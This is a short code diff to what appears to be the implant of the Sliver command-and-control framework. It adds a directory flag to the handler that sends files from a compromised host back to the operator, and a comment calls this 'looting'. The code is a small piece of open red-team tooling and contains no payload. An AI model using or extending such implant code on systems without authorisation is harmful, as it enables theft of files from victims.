@@ -277,6 +277,13 @@ func pwdHandler(data []byte, resp RPCResponse) {
 // Send a file back to the hive
 func downloadHandler(data []byte, resp RPCResponse) {
 	var rawData []byte
+
+	/*
+		A flag for whether this is a directory - used if
+		this download is being looted
+	*/
+	var isDir bool
+
 	downloadReq := &sliverpb.DownloadReq{}
 	err := proto.Unmarshal(data, downloadReq)
 	if err != nil {
@@ -307,8 +314,10 @@ func downloadHandler(data []byte, resp RPCResponse) {
 		log.Printf("error creating the archive: %v", err)
 		// {{end}}
 		rawData = dirData.Bytes()
+		isDir = true
 	} else {
 		rawData, err = ioutil.ReadFile(target)
+		isDir = false
 	}
 
 	var download *sliverpb.Download
@@ -320,6 +329,7 @@ func downloadHandler(data []byte, resp RPCResponse) {
 			Data:    gzipData.Bytes(),
 			Encoder: "gzip",
 			Exists:  true,
+			IsDir:   isDir,
 		}
 	} else {
 		download = &sliverpb.Download{Path: target, Exists: false}
